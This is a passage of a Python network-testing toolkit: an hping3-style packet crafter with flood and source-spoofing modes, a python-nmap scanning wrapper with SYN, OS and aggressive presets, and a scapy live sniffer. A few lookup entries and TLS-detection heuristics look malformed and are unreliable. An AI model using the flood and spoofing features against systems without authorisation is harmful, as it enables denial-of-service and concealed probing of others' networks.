            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("hping> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "7":
            online_hping_console()
            continue
        if choice == "0":
            return
        if choice in ("1", "2", "3", "4", "5"):
            target_raw = prompt_text("target IPv4/hostname")
            if target_raw is PROMPT_ABORT:
                continue
            target = resolve_target(str(target_raw))
            if not target:
                err("unresolvable target '%s'." % target_raw)
                continue
            if choice == "3":
                protocol = "icmp"
                flags = ""
                dport = 0
            elif choice == "2":
                protocol = "udp"
                flags = ""
                dport_raw = prompt_text("destination port", default="53")
                if dport_raw is PROMPT_ABORT:
                    continue
                try:
                    dport = parse_port(dport_raw)
                except FrameworkError as exc:
                    err(str(exc))
                    continue
            else:
                protocol = "tcp"
                dport_raw = prompt_text("destination port", default="80")
                if dport_raw is PROMPT_ABORT:
                    continue
                try:
                    dport = parse_port(dport_raw)
                except FrameworkError as exc:
                    err(str(exc))
                    continue
                flag_raw = prompt_text("flags (S, SA, A, FPU, PA, R ...)", default="S")
                if flag_raw is PROMPT_ABORT:
                    continue
                try:
                    flags = parse_flag_spec(flag_raw)
                except FrameworkError as exc:
                    err(str(exc))
                    continue
            count_raw = prompt_int("packet count (0 = until Ctrl-C)", 0, 1000000, 4)
            if count_raw is PROMPT_ABORT:
                continue
            if choice == "4":
                interval = 0.0
                flood = True
                warn("Flood mode disables pacing. Validate authorisation before proceeding.")
            else:
                interval = prompt_float("interval seconds between packets", 0.0, 600.0, 1.0)
                if interval is PROMPT_ABORT:
                    continue
                flood = False
            pps = (1.0 / interval) if interval > 0 else float(HARD_PPS_CEILING)
            if pps > MAX_PPS and not flood:
                warn("requested %.0f pps exceeds the soft ceiling of %d pps." % (pps, MAX_PPS))
                if not prompt_yes_no("Proceed anyway (within the hard ceiling of %d pps)?" % HARD_PPS_CEILING, False):
                    continue
            ttl = prompt_int("TTL", 1, 255, 64)
            if ttl is PROMPT_ABORT:
                continue
            payload_text = prompt_text("payload text or hex:.... (blank = none)", default="", allow_blank=True)
            if payload_text is PROMPT_ABORT:
                continue
            data = b""
            data_is_random = False
            data_size = 0
            text = str(payload_text).strip()
            if text.lower().startswith("hex:"):
                try:
                    data = bytes.fromhex(re.sub(r"[^0-9a-fA-F]", "", text[4:]))
                except ValueError:
                    warn("hex payload unparsable - sending random payload instead.")
                    data_is_random = True
                    data_size = 56
            elif text.lower().startswith("rand:"):
                try:
                    data_size = int(text[5:].strip(), 10)
                except ValueError:
                    data_size = 56
                data_is_random = True
            elif text:
                data = text.encode("utf-8", "replace")
            rand_source = None
            if choice == "5":
                prompt_source = prompt_text("source spoof range (e.g. 10.0.0.0/24)", default="", allow_blank=True)
                if prompt_source is PROMPT_ABORT:
                    continue
                if str(prompt_source).strip():
                    try:
                        ipaddress.IPv4Network(str(prompt_source).strip(), strict=False)
                        rand_source = str(prompt_source).strip()
                    except (ValueError, ipaddress.NetmaskValueError):
                        err("'%s' is not a valid source range - aborting." % prompt_source)
                        continue
                else:
                    warn("no spoof range supplied - falling back to the local source address.")
            sport_inc = prompt_yes_no("increment source port per packet?", False)
            dport_inc = prompt_yes_no("increment destination port per packet?", False) if protocol != "icmp" else False
            try:
                engine = HpingReplicator(
                    target=target, protocol=protocol, dport=dport, flags=flags,
                    count=int(count_raw), interval=float(interval), ttl=int(ttl),
                    data=data, data_is_random=data_is_random, data_size=data_size,
                    rand_source_prefix=rand_source, sport_increment=sport_inc,
                    dport_increment=dport_inc, flood=flood,
                )
                engine.run()
            except FrameworkError as exc:
                err(str(exc))
                continue
        elif choice == "6":
            heading("HPING3 FLAG EQUIVALENCE")
            mapping = [
                ("hping3 -S -p 80 host", "TCP SYN probe  ->  menu option [1] flags=S"),
                ("hping3 -A -p 80 host", "TCP ACK probe  ->  flags=A (firewall state mapping)"),
                ("hping3 -F -p 80 host", "TCP FIN probe  ->  flags=F"),
                ("hping3 -R -p 80 host", "TCP RST probe  ->  flags=R"),
                ("hping3 -P -p 80 host", "TCP PUSH probe ->  flags=P"),
                ("hping3 -SFPU host", "XMAS scan      ->  flags=FPU ('xmas' accepted)"),
                ("hping3 --flood -S host", "unpaced blast ->  option [4] (authorised tests only)"),
                ("hping3 -c 100 -i u10000 host", "100 packets @10ms -> count=100 interval=0.01"),
                ("hping3 -d 120 -E file host", "payload injection -> payload text/hex: option"),
                ("hping3 --rand-source host", "source spoofing -> option [5]"),
                ("hping3 --ttl 32 host", "custom TTL -> TTL prompt"),
                ("hping3 -2 -p 53 host", "UDP mode -> option [2]"),
                ("hping3 -1 host", "ICMP mode -> option [3]"),
            ]
            for syntax, description in mapping:
                out("  %s" % c(syntax.ljust(34), "cyan") + c(description, "grey"))
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE 4 - INTEGRATED NMAP SUB-ENGINE (python-nmap)
# ===========================================================================
class NmapEngine:
    """Full-featured python-nmap integration: discovery, fast, aggressive, custom."""

    ARG_PRESETS = OrderedDict([
        ("discovery", "-sn"),                                  # ping sweep / host discovery
        ("fast", "-F -T4"),                                    # top-100 fast scan
        ("service", "-sV -T4 --version-light"),                # version detection
        ("aggressive", "-A -T4"),                              # OS + version + scripts + traceroute
        ("os", "-O --osscan-guess -T4"),                       # OS fingerprinting focus
        ("syn", "-sS -T4"),                                    # stealth SYN scan, needs root
        ("udp_top", "-sU --top-ports 50 -T4"),                 # top-50 UDP, needs root
    ])

    @staticmethod
    def binary_available() -> bool:
        return shutil.which("nmap") is not None

    @staticmethod
    def binary_version() -> str:
        if not NmapEngine.binary_available():
            return "not installed"
        try:
            proc = subprocess.run(["nmap", "--version"], stdout=subprocess.PIPE,
                                  stderr=subprocess.DEVNULL, timeout=10, check=False, text=True)
            first = (proc.stdout or "").splitlines()
            return first[0].strip() if first else "unknown"
        except (OSError, subprocess.SubprocessError):
            return "unknown"

    @staticmethod
    def capability_report() -> Tuple[bool, str]:
        if not NMAP_LIB_AVAILABLE:
            return False, ("python-nmap library missing (%s). Install with: python3 -m pip install python-nmap"
                           % NMAP_LIB_ERROR)
        if not NmapEngine.binary_available():
            return False, ("nmap binary missing from PATH. Debian/Ubuntu: sudo apt install nmap | "
                           "macOS: brew install nmap | Windows: winget install Insecure.Org.Nmap")
        return True, "ready: %s" % NmapEngine.binary_version()

    @staticmethod
    def execute(targets: str, arguments: str, ports: Optional[str] = None,
                timeout: Optional[float] = None, sudo_target: bool = False) -> Dict[str, Any]:
        """Run a scan through python-nmap and return a normalised result bundle."""
        ready, detail = NmapEngine.capability_report()
        if not ready:
            raise FrameworkError(detail)
        if not str(targets).strip():
            raise FrameworkError("no targets supplied to the nmap sub-engine")
        argument_line = str(arguments or "-F")
        try:
            scanner = nmap_lib.PortScanner()
        except Exception as exc:
            raise FrameworkError("python-nmap initialisation failed: %s: %s" % (type(exc).__name__, exc))
        started = time.time()
        note("python-nmap -> targets=%s ports=%s args='%s'"
             % (targets, ports if ports else "default", argument_line))
        try:
            scan_kwargs: Dict[str, Any] = {"arguments": argument_line}
            if ports:
                scan_kwargs["ports"] = str(ports)
            if timeout:
                scan_kwargs["timeout"] = float(timeout)
            if sudo_target and hasattr(nmap_lib.PortScanner, "scan"):
                try:
                    scanner.scan(hosts=str(targets), sudo=True, **scan_kwargs)
                except TypeError:
                    scanner.scan(hosts=str(targets), **scan_kwargs)
            else:
                scanner.scan(hosts=str(targets), **scan_kwargs)
        except nmap_lib.PortScannerError as exc:
            raise FrameworkError("nmap refused the request: %s" % exc)
        except (subprocess.SubprocessError, OSError) as exc:
            raise FrameworkError("nmap process failure: %s" % exc)
        except Exception as exc:
            raise FrameworkError("unexpected nmap failure: %s: %s" % (type(exc).__name__, exc))
        elapsed = time.time() - started
        bundles: List[Dict[str, Any]] = []
        try:
            host_list = list(scanner.all_hosts())
        except Exception:
            host_list = []
        for host in host_list:
            bundle: Dict[str, Any] = OrderedDict([("host", host)])
            try:
                bundle["state"] = scanner[host].state()
            except (KeyError, TypeError):
                bundle["state"] = "unknown"
            try:
                bundle["hostnames"] = [entry.get("name", "") for entry in scanner[host].get("hostnames", [])
                                       if entry.get("name")]
            except (AttributeError, TypeError):
                bundle["hostnames"] = []
            try:
                bundle["addresses"] = dict(scanner[host].get("addresses", {}))
            except (AttributeError, TypeError):
                bundle["addresses"] = {}
            protocols: List[str] = []
            try:
                protocols = list(scanner[host].all_protocols())
            except (AttributeError, TypeError):
                protocols = []
            bundle["protocols"] = protocols
            ports_found: List[Dict[str, Any]] = []
            for protocol in protocols:
                try:
                    port_map = scanner[host][protocol]
                except (KeyError, TypeError):
                    continue
                for port in sorted(port_map.keys()):
                    try:
                        details = port_map[port]
                    except (KeyError, TypeError):
                        continue
                    entry = OrderedDict([
                        ("protocol", protocol),
                        ("port", port),
                        ("state", details.get("state", "unknown")),
                        ("service", details.get("name", "unknown")),
                        ("product", details.get("product", "")),
                        ("version", details.get("version", "")),
                        ("extrainfo", details.get("extrainfo", "")),
                        ("cpe", details.get("cpe", "")),
                        ("reason", details.get("reason", "")),
                        ("scripts", details.get("script", {}) if isinstance(details.get("script", {}), dict) else {}),
                    ])
                    ports_found.append(entry)
            bundle["ports"] = ports_found
            try:
                bundle["os_matches"] = [
                    OrderedDict([("name", match.get("name", "")),
                                 ("accuracy", match.get("accuracy", "")),
                                 ("family", match.get("osfamily", ""))])
                    for match in scanner[host].get("osmatch", [])[:5]
                ]
            except (AttributeError, TypeError):
                bundle["os_matches"] = []
            try:
                bundle["uptime"] = scanner[host].get("uptime", {})
            except (AttributeError, TypeError):
                bundle["uptime"] = {}
            try:
                bundle["tcp_sequence"] = scanner[host].get("tcpsequence", {})
            except (AttributeError, TypeError):
                bundle["tcp_sequence"] = {}
            try:
                bundle["traceroute"] = scanner[host].get("trace", {})
            except (AttributeError, TypeError):
                bundle["traceroute"] = {}
            bundles.append(bundle)
        raw_output: str = ""
        try:
            candidate = scanner.get_nmap_last_output()
            if isinstance(candidate, (bytes, bytearray)):
                # python-nmap releases differ: some return the XML as bytes.
                raw_output = bytes(candidate).decode("utf-8", "replace")
            elif candidate:
                raw_output = str(candidate)
        except Exception as exc:
            LOGGER.event("warn", "raw nmap output unavailable: %s" % exc, level="WARN")
            raw_output = ""
        result = OrderedDict([
            ("mode", "python-nmap"),
            ("targets", str(targets)),
            ("arguments", argument_line),
            ("ports_argument", ports or "default"),
            ("hosts_requested", len(str(targets).split()) or 1),
            ("hosts_reported", len(bundles)),
            ("elapsed_seconds", round(elapsed, 3)),
            ("scaninfo", NmapEngine._safe_scaninfo(scanner)),
            ("hosts", bundles),
            ("raw_xml_length", len(raw_output)),
        ])
        if raw_output:
            artifact_dir = LOGGER.artifact_dir
            try:
                os.makedirs(artifact_dir, exist_ok=True)
                xml_name = "%s_nmap_%s.xml" % (LOGGER.session_id, uuid.uuid4().hex[:6])
                xml_path = os.path.join(artifact_dir, xml_name)
                with open(xml_path, "w", encoding="utf-8") as handle:
                    handle.write(raw_output)
                result["raw_xml_path"] = xml_path
            except OSError as exc:
                LOGGER.event("warn", "could not persist nmap XML: %s" % exc, level="WARN")
        return result

    @staticmethod
    def _safe_scaninfo(scanner: Any) -> Dict[str, Any]:
        try:
            info = scanner.scaninfo()
            if isinstance(info, dict):
                cleaned: Dict[str, Any] = {}
                for key, value in info.items():
                    cleaned[str(key)] = value if isinstance(value, (str, int, float)) else str(value)
                return cleaned
            return {"info": str(info)}
        except Exception:
            return {}

    @staticmethod
    def render(result: Dict[str, Any]) -> None:
        heading("NMAP RESULTS")
        kv_table([
            ("Targets", result.get("targets", "?")),
            ("Arguments", result.get("arguments", "?")),
            ("Ports argument", result.get("ports_argument", "default")),
            ("Hosts reported", result.get("hosts_reported", 0)),
            ("Elapsed", "%ss" % result.get("elapsed_seconds", 0)),
        ])
        scaninfo = result.get("scaninfo", {})
        if scaninfo:
            out("")
            out(c("  scan metadata: %s" % json.dumps(scaninfo, default=str)[:200], "grey"))
        hosts = result.get("hosts", [])
        if not hosts:
            warn("nmap reported no hosts - target may be down, filtered, or the arguments too narrow.")
            return
        for bundle in hosts:
            out("")
            state_colour = "bgreen" if bundle.get("state") == "up" else "bred"
            title = "  HOST %s  [%s]" % (bundle.get("host", "?"), c(bundle.get("state", "?").upper(), state_colour))
            out(c(title, "bold"))
            if bundle.get("hostnames"):
                out("    hostnames : %s" % ", ".join(bundle["hostnames"][:5]))
            addresses = bundle.get("addresses", {})
            if addresses:
                out("    addresses : %s" % ", ".join("%s=%s" % (k, v) for k, v in addresses.items()))
            uptime = bundle.get("uptime", {})
            if uptime:
                seconds = uptime.get("seconds", 0)
                out("    uptime    : %s" % format_duration(seconds) if seconds else "    uptime    : n/a")
            ports = bundle.get("ports", [])
            open_ports = [entry for entry in ports if entry.get("state") == "open"]
            if open_ports:
                header = "    %-6s %-9s %-22s %s" % ("PORT", "STATE", "SERVICE", "VERSION / DETAIL")
                out(c(header, "cyan"))
                for entry in open_ports:
                    version = " ".join(part for part in (
                        entry.get("product", ""), entry.get("version", ""), entry.get("extrainfo", "")) if part)
                    out("    %-6s %-9s %-22s %s" % (
                        "%s/%s" % (entry.get("port"), entry.get("protocol")),
                        c(entry.get("state", "?"), "bgreen"),
                        entry.get("service", "?") + ((" (%s)" % entry["cpe"]) if entry.get("cpe") else ""),
                        c(version or entry.get("reason", ""), "grey"),
                    ))
                    scripts = entry.get("scripts") or {}
                    if isinstance(scripts, dict):
                        for script_name, script_output in list(scripts.items())[:5]:
                            first_line = str(script_output).splitlines()[0] if str(script_output) else ""
                            out("           %s %s" % (
                                c("└─ %s:" % script_name, "bmagenta"),
                                c(first_line[:110], "grey")))
            else:
                out("    no open ports reported.")
            closed = [entry for entry in ports if entry.get("state") == "closed"]
            filtered = [entry for entry in ports if entry.get("state") in ("filtered", "open|filtered")]
            if closed or filtered:
                out("    %s" % c("state tally: open=%d closed=%d filtered=%d"
                                 % (len(open_ports), len(closed), len(filtered)), "grey"))
            if bundle.get("os_matches"):
                out("    %s" % c("OS fingerprint candidates:", "cyan"))
                for match in bundle["os_matches"]:
                    out("      - %s (%s%%) family=%s" % (
                        match.get("name", "?"), match.get("accuracy", "?"), match.get("family", "?")))
            trace = bundle.get("traceroute", {})
            if trace and isinstance(trace, dict) and trace.get("hops"):
                hops = trace.get("hops", {})
                out("    %s" % c("nmap traceroute (%d hops):" % len(hops), "cyan"))
                try:
                    for hop_index in sorted(hops.keys(), key=lambda value: int(value))[:12]:
                        hop = hops[hop_index]
                        out("      hop %-3s %-16s %s" % (
                            hop_index, hop.get("ipaddr", "*"), hop.get("host", "")))
                except (TypeError, ValueError, AttributeError):
                    out("      (traceroute data not renderable)")
        if result.get("raw_xml_path"):
            note("raw nmap XML: %s" % result["raw_xml_path"])


@module_guard("Nmap Sub-Engine")
def module_nmap(args: Optional[List[str]] = None) -> None:
    """Interactive wrapper around the python-nmap binding with curated presets."""
    actions = OrderedDict([
        ("1", "Host discovery sweep (-sn)"),
        ("2", "Fast port scan (-F)"),
        ("3", "Service/version detection (-sV)"),
        ("4", "Aggressive profiling (-A: OS, version, scripts, traceroute) - root required"),
        ("5", "Custom nmap arguments (expert mode)"),
        ("6", "Top-ports UDP probe (-sU, root required)"),
        ("7", "Engine status and installation guidance"),
        ("8", "ONLINE: scan enrichment (RDAP ownership, TLS, artefact push)"),
        ("0", "Return to main menu"),
    ])
    while True:
        heading("MODULE 04 - NMAP SUB-ENGINE")
        ready, detail = NmapEngine.capability_report()
        out("  engine: %s" % (c(detail, "bgreen") if ready else c(detail, "byellow")))
        for key, label in actions.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("nmap> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "8":
            online_nmap_console()
            continue
        if choice == "0":
            return
        if choice == "7":
            heading("NMAP ENGINE STATUS")
            kv_table([
                ("python-nmap library", "present" if NMAP_LIB_AVAILABLE else "MISSING"),
                ("nmap binary", NmapEngine.binary_version()),
                ("binary path", shutil.which("nmap") or "not found in PATH"),
                ("library import error", NMAP_LIB_ERROR or "none"),
                ("recommended install", "sudo apt install nmap  |  python3 -m pip install python-nmap"),
            ])
            continue
        if not ready:
            err(detail)
            continue
        if choice in ("1", "2", "3", "4", "6"):
            target_raw = prompt_text("target spec (host, CIDR, range or comma list)")
            if target_raw is PROMPT_ABORT:
                continue
            targets = str(target_raw).strip()
            try:
                if "/" not in targets and "," not in targets and "-" not in targets:
                    if resolve_target(targets) is None:
                        err("cannot resolve '%s'." % targets)
                        continue
            except FrameworkError as exc:
                err(str(exc))
                continue
            ports_argument: Optional[str] = None
            if choice in ("2", "3", "4", "6"):
                port_prompt = prompt_text("port spec for nmap (blank = preset default, e.g. 22,80 or 1-1024)",
                                          default="", allow_blank=True)
                if port_prompt is PROMPT_ABORT:
                    continue
                ports_argument = str(port_prompt).strip() or None
            if choice == "1":
                arguments = "-sn"
            elif choice == "2":
                arguments = "-F -T4"
            elif choice == "3":
                arguments = "-sV -T4 --version-light"
            elif choice == "4":
                arguments = "-A -T4"
            else:
                arguments = "-sU --top-ports 50 -T4"
            needs_root = arguments.startswith(("-A", "-sU", "-sS", "-O"))
            if needs_root and not Privileges.is_root():
                warn("this argument set benefits from root (raw-socket scanning).")
                if not prompt_yes_no("Continue anyway with unprivileged fallback?", False):
                    continue
            timeout_raw = prompt_int("scan timeout seconds (0 = nmap default)", 0, 3600, 0)
            if timeout_raw is PROMPT_ABORT:
                continue
            try:
                result = NmapEngine.execute(targets, arguments, ports_argument,
                                            float(timeout_raw) if timeout_raw else None)
            except FrameworkError as exc:
                err(str(exc))
                continue
            NmapEngine.render(result)
            artifact = LOGGER.scan("nmap_scan", result, target=targets)
            if artifact:
                note("artefact: %s" % artifact)
            LOGGER.event("scan", "nmap scan complete (%s) against %s: %d host(s)"
                         % (arguments, targets, result.get("hosts_reported", 0)))
        elif choice == "5":
            target_raw = prompt_text("target spec (host, CIDR, range or comma list)")
            if target_raw is PROMPT_ABORT:
                continue
            arguments = prompt_text("nmap arguments", default="-F -T4")
            if arguments is PROMPT_ABORT:
                continue
            ports_argument = prompt_text("ports argument (blank = inside arguments)", default="", allow_blank=True)
            if ports_argument is PROMPT_ABORT:
                continue
            warned = False
            for token in str(arguments).split():
                if token in ("--script", "--script-args", "-oN", "-oX", "-oG", "-oS", "--interactive"):
                    if not warned:
                        warn("output-file and interactive arguments are ignored by this wrapper.")
                        warned = True
            try:
                result = NmapEngine.execute(str(target_raw), str(arguments),
                                            str(ports_argument).strip() or None)
            except FrameworkError as exc:
                err(str(exc))
                continue
            NmapEngine.render(result)
            artifact = LOGGER.scan("nmap_scan", result, target=str(target_raw))
            if artifact:
                note("artefact: %s" % artifact)
        else:
            warn("unrecognised selection '%s'." % choice)



# ===========================================================================
# MODULE 5 - NATIVE LIVE PACKET SNIFFER (scapy sniff() with live callbacks)
# ===========================================================================
OUI_VENDORS = {
    "000c29": "VMware", "005056": "VMware", "080027": "Oracle VirtualBox",
    "525400": "QEMU/KVM virtual NIC", "00155d": "Microsoft Hyper-V",
    "001c42": "Parallels", "00163e": "Xen", "acde48": "Private (locally assigned)",
    "deade": "Private (locally assigned)",
    "000569": "VMware", "001b21": "Intel", "001e67": "Intel", "3c970e": "Wistron",
    "b827eb": "Raspberry Pi Foundation", "dc:a632": "Raspberry Pi Trading",
    "f4f26d": "Routerboard/Mikrotik", "000c42": "Routerboard/Mikrotik",
    "e8de27": "TP-Link", "50c7bf": "TP-Link", "a42bb0": "TP-Link",
    "f4ec38": "TP-Link", "b0487a": "TP-Link", "34e894": "TP-Link",
    "0018e7": "Cameo/TP-Link", "00248c": "ASUSTek", "1c872c": "ASUSTek",
    "2c56dc": "ASUSTek", "04d4c4": "ASUSTek", "704d7b": "ASUSTek",
    "0005cd": "D-Link", "1cbdb9": "D-Link", "0026f2": "NETGEAR",
    "20e52a": "NETGEAR", "a040a0": "NETGEAR", "9c3dcf": "NETGEAR",
    "001dd3": "Apple", "002500": "Apple", "3c0754": "Apple", "f0dbe2": "Apple",
    "d83062": "Apple", "68a86d": "Apple", "f81edf": "Apple", "acbc32": "Apple",
    "0017f2": "Apple", "e0b9ba": "Apple", "64200c": "Apple",
    "001cc4": "HP", "3c4a92": "HP", "9457a5": "HP", "b0c745": "HP",
    "0021cc": "Flextronics", "0024d7": "Samsung", "5001bb": "Samsung",
    "002637": "Samsung", "f008d1": "Samsung", "0012fb": "Samsung",
    "00e04c": "Realtek", "001c62": "LG Innotek", "001a11": "Google",
    "f4f5e8": "Google", "3c5ab4": "Google", "d89e3f": "Google",
    "00248d": "Sony", "fc0fe6": "Sony", "0013a9": "Sony",
    "0026bb": "Apple", "001124": "Apple", "b8e856": "Apple",
}


def oui_vendor(mac: str, fallback: str = "unknown OUI") -> str:
    """Return a human-readable vendor for an OUI prefix, plus assignment class."""
    try:
        cleaned = re.sub(r"[^0-9a-fA-F]", "", str(mac)).lower()
        if len(cleaned) < 6:
            return fallback
        prefix = cleaned[:6]
        vendor = OUI_VENDORS.get(prefix) or OUI_VENDORS.get(prefix[:5]) or ""
        if vendor:
            return vendor
        try:
            first_octet = int(cleaned[:2], 16)
            if first_octet & 0x02:
                return "locally administered / randomised MAC"
        except ValueError:
            pass
        return fallback
    except (TypeError, ValueError, AttributeError):
        return fallback


class PacketDecoder:
    """Translate a scapy packet into a flat, renderable dictionary."""

    @staticmethod
    def decode(packet: Any) -> Dict[str, Any]:
        decoded: Dict[str, Any] = OrderedDict([
            ("timestamp", float(getattr(packet, "time", time.time()))),
            ("length", len(bytes(packet))),
            ("summary", "<unparsed>"),
            ("layers", []),
            ("protocol", "UNKNOWN"),
            ("src", "-"),
            ("dst", "-"),
            ("direction", "unknown"),
        ])
        try:
            decoded["summary"] = str(packet.summary())
            decoded["layers"] = [layer.__name__ for layer in packet.layers()]
        except Exception:
            return decoded
        try:
            if packet.haslayer(ARP):
                arp = packet[ARP]
                decoded["protocol"] = "ARP"
                decoded["src"] = arp.psrc
                decoded["dst"] = arp.pdst
                decoded["arp"] = OrderedDict([
                    ("op", PacketDecoder._safe_int(arp.op)),
                    ("operation", {1: "who-has (request)", 2: "is-at (reply)"}.get(PacketDecoder._safe_int(arp.op), "op %d" % arp.op)),
                    ("sender_mac", arp.hwsrc),
                    ("sender_ip", arp.psrc),
                    ("target_mac", arp.hwdst),
                    ("target_ip", arp.pdst),
                    ("vendor", oui_vendor(arp.hwsrc)),
                ])
            if packet.haslayer(IP):
                ip_layer = packet[IP]
                decoded["src"] = ip_layer.src
                decoded["dst"] = ip_layer.dst
                decoded["ip"] = OrderedDict([
                    ("ttl", PacketDecoder._safe_int(ip_layer.ttl)),
                    ("tos", PacketDecoder._safe_int(ip_layer.tos)),
                    ("id", PacketDecoder._safe_int(ip_layer.id)),
                    ("len", PacketDecoder._safe_int(ip_layer.len)),
                    ("proto", PacketDecoder._safe_int(ip_layer.proto)),
                    ("proto_name", IP_PROTO_NAMES.get(PacketDecoder._safe_int(ip_layer.proto), "proto-%d" % ip_layer.proto)),
                    ("flags", str(ip_layer.flags)),
                    ("frag", PacketDecoder._safe_int(ip_layer.frag)),
                ])
                decoded["protocol"] = decoded["ip"]["proto_name"]
            if packet.haslayer(TCP):
                tcp_layer = packet[TCP]
                payload_len = len(bytes(tcp_layer.payload)) if tcp_layer.payload else 0
                decoded["protocol"] = "TCP"
                decoded["tcp"] = OrderedDict([
                    ("sport", PacketDecoder._safe_int(tcp_layer.sport)),
                    ("dport", PacketDecoder._safe_int(tcp_layer.dport)),
                    ("flags", str(tcp_layer.flags) or "NONE"),
                    ("seq", PacketDecoder._safe_int(tcp_layer.seq)),
                    ("ack", PacketDecoder._safe_int(tcp_layer.ack)),
                    ("window", PacketDecoder._safe_int(tcp_layer.window)),
                    ("payload_len", payload_len),
                    ("service", COMMON_PORTS.get(PacketDecoder._safe_int(tcp_layer.dport), "unknown")),
                ])
                decoded["port"] = PacketDecoder._safe_int(tcp_layer.dport)
                decoded["app_port"] = PacketDecoder._safe_int(tcp_layer.dport)
            if packet.haslayer(UDP):
                udp_layer = packet[UDP]
                payload_len = len(bytes(udp_layer.payload)) if udp_layer.payload else 0
                decoded["protocol"] = "UDP"
                decoded["udp"] = OrderedDict([
                    ("sport", PacketDecoder._safe_int(udp_layer.sport)),
                    ("dport", PacketDecoder._safe_int(udp_layer.dport)),
                    ("len", PacketDecoder._safe_int(udp_layer.len)),
                    ("payload_len", payload_len),
                    ("service", COMMON_PORTS.get(PacketDecoder._safe_int(udp_layer.dport), "unknown")),
                ])
                decoded["port"] = PacketDecoder._safe_int(udp_layer.dport)
                decoded["app_port"] = PacketDecoder._safe_int(udp_layer.dport)
            if packet.haslayer(ICMP):
                icmp_layer = packet[ICMP]
                decoded["protocol"] = "ICMP"
                decoded["icmp"] = OrderedDict([
                    ("type", PacketDecoder._safe_int(icmp_layer.type)),
                    ("type_name", ICMP_TYPE_NAMES.get(PacketDecoder._safe_int(icmp_layer.type), "type-%d" % icmp_layer.type)),
                    ("code", PacketDecoder._safe_int(icmp_layer.code)),
                ])
            if packet.haslayer(DNS):
                dns_layer = packet[DNS]
                question = ""
                try:
                    if dns_layer.qd is not None and dns_layer.qd.qname is not None:
                        question = dns_layer.qd.qname.decode("utf-8", "replace").rstrip(".")
                except (AttributeError, UnicodeDecodeError, TypeError):
                    question = ""
                decoded["dns"] = OrderedDict([
                    ("id", PacketDecoder._safe_int(dns_layer.id)),
                    ("qr", PacketDecoder._safe_int(dns_layer.qr)),
                    ("question", question),
                ])
            payload_bytes = PacketDecoder.payload_of(packet)
            if payload_bytes:
                decoded["payload_hex"] = payload_bytes[:64].hex()
                decoded["payload_text"] = PacketDecoder.payload_preview(payload_bytes)
            decoded["direction"] = "inbound" if str(decoded["src"]).startswith(
                tuple(PacketDecoder._local_prefixes())[:1] or ("0.",)) else "observed"
        except (AttributeError, IndexError, KeyError, TypeError, ValueError) as exc:
            decoded["decode_error"] = "%s: %s" % (type(exc).__name__, exc)
        return decoded

    @staticmethod
    def _safe_int(value: Any, default: int = 0) -> int:
        """
        Coerce a scapy field to int, tolerating fields that are lazily None.

        scapy leaves computed header fields such as IP.len / UDP.len unset until
        a packet is serialised. Dissection must never raise on such a packet, so
        unset fields degrade to a default instead.
        """
        try:
            if value is None:
                return default
            return int(value)
        except (TypeError, ValueError):
            return default

    @staticmethod
    def _local_prefixes() -> List[str]:
        prefixes: List[str] = []
        for entry in InterfaceManager.list_interfaces():
            address = entry.get("ipv4", "")
            if address and address not in ("0.0.0.0", "n/a"):
                prefixes.append(str(address))
        return prefixes

    @staticmethod
    def payload_of(packet: Any) -> bytes:
        """Extract the innermost Raw payload if present."""
        try:
            if packet.haslayer(Raw):
                return bytes(packet[Raw].load)
        except Exception:
            return b""
        return b""

    @staticmethod
    def payload_preview(payload: bytes, limit: int = 60) -> str:
        if not payload:
            return ""
        head = payload[:4]
        if head in (b"GET ", b"POST", b"HEAD", b"PUT ", b"DELE") or payload[:5] == b"HTTP/":
            first_line = payload.split(b"\r\n", 1)[0][:limit]
            return "HTTP: %s" % first_line.decode("utf-8", "replace")
        if payload[:1] == b"\x16" and len(payload) > 5:
            return "TLS handshake record (len=%d)" % int.from_bytes(payload[3:5], "big")
        if payload[:1] == b"\x17":
            return "TLS application data record"
        if payload[:2] == b"\x03\x00" or payload[:2] == b"\x03\x01":
            return "TLS record legacy/version negotiation"
        if len(payload) > 1 and payload[0] == 0xFF:
            return "possible TLS ClientHello (0xFF record wrapper)"
        printable = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in payload[:limit])
        return "%s%s" % (printable, "…" if len(payload) > limit else "")


class LiveSniffer:
    """
    Passive capture engine built on scapy's native sniff() with a live callback.

    Responsibilities: BPF compilation, live one-line dissection, per-protocol
    and per-talker accounting, optional hex dumping, and optional PCAP export
    of everything captured during the session.
    """

    def __init__(self, iface: Optional[str] = None, bpf_filter: str = "",
                 count: int = SNIFFER_DEFAULT_COUNT, promisc: bool = True,
                 show_hex: bool = False, save_pcap: bool = False,
                 max_packets: int = 20000, quiet: bool = False) -> None:
        self.iface = iface
        self.bpf_filter = bpf_filter.strip()
        self.count = max(0, int(count))
        self.promisc = bool(promisc)
        self.show_hex = bool(show_hex)
        self.save_pcap = bool(save_pcap)
        self.max_packets = max(100, int(max_packets))
        self.quiet = bool(quiet)
        self.packet_index = 0
        self.bytes_total = 0
        self.protocol_counter: Counter = Counter()
        self.talker_counter: Counter = Counter()
        self.port_counter: Counter = Counter()
        self.stored: List[Any] = []
        self.started_at = time.time()
        self.ended_at: Optional[float] = None
        self.last_stats_at = time.time()
        self.records: List[Dict[str, Any]] = []
        self._stop_requested = False

    # -- callback --------------------------------------------------------
    def handle_packet(self, packet: Any) -> None:
        """Live callback: decode, display and account for one captured frame."""
        try:
            self.packet_index += 1
            decoded = PacketDecoder.decode(packet)
            self.bytes_total += decoded.get("length", 0)
            self.protocol_counter[decoded.get("protocol", "UNKNOWN")] += 1
            if decoded.get("src", "-") != "-":
                self.talker_counter["%s -> %s" % (decoded.get("src"), decoded.get("dst"))] += 1
            if decoded.get("app_port"):
                self.port_counter[int(decoded["app_port"])] += 1
            if self.save_pcap and len(self.stored) < self.max_packets:
                self.stored.append(packet)
            if len(self.records) < 5000:
                self.records.append(decoded)
            if not self.quiet:
                self.render_live(decoded)
                if self.show_hex:
                    payload = PacketDecoder.payload_of(packet)
                    if payload:
                        out(hexdump(payload, max_bytes=96))
            now = time.time()
            if not self.quiet and (now - self.last_stats_at) >= SNIFFER_STATS_PERIOD:
                self.last_stats_at = now
                self.render_rollup(compact=True)
        except (AttributeError, IndexError, KeyError, TypeError, ValueError) as exc:
